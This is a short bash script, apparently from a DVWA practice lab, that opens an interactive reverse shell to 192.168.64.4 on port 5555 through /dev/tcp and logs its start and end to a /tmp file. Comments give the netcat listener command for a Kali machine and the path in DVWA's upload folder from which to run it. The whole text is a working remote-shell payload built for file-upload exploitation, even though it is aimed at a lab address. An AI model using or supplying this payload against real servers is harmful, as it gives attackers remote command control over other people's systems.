#!/bin/bash
echo "Starting reverse shell" > /tmp/reverse_shell_debug.txt
bash -i >& /dev/tcp/192.168.64.4/5555 0>&1
echo "Reverse shell completed" >> /tmp/reverse_shell_debug.txt

# nc -lvp 5555 on your kali machine to listen to the port 5555
# /bin/bash /var/www/html/DVWA/hackable/uploads/reverse_shell.sh to run the file



